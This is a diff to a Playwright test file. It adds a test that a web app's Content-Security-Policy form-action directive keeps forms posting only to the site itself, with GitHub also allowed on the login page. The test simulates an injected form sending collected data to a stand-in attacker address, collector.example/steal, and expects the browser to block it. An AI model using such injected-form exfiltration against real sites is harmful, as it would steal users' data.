@@ -7,6 +7,7 @@ import {
 	login,
 	logout,
 	PASSWORD,
+	postInjectedForm,
 	resetLocalIpLimit,
 	signupUser,
 	uniqueEmail,
@@ -77,6 +78,26 @@ test("pages run their own scripts only", async ({ page }) => {
 		return (window as Window & { __injected?: boolean }).__injected === true
 	})
 	expect(ran).toBe(false)
+})
+
+const formAction = (csp: string) => /(?:^|;\s*)form-action ([^;]*)/.exec(csp)?.[1]
+
+test("pages' forms post to this origin only", async ({ page }) => {
+	const response = await page.goto("/support")
+	expect(formAction(response?.headers()["content-security-policy"] ?? "")).toBe("'self'")
+	await waitForHydration(page)
+	// A form that injected HTML would add, posting what it collects to another site, is stopped
+	// before anything leaves the page.
+	expect(await postInjectedForm(page, "https://collector.example/steal")).toEqual({
+		outcome: "form-action",
+		reached: [],
+	})
+
+	// The sign-in pages also let their own forms go on to the providers they offer: GitHub here.
+	const login = await page.request.get("/login")
+	expect(formAction(login.headers()["content-security-policy"] ?? "")).toBe(
+		"'self' https://github.com",
+	)
 })
 
 test("home and login render in Spanish when the browser prefers it", async ({ browser }) => {
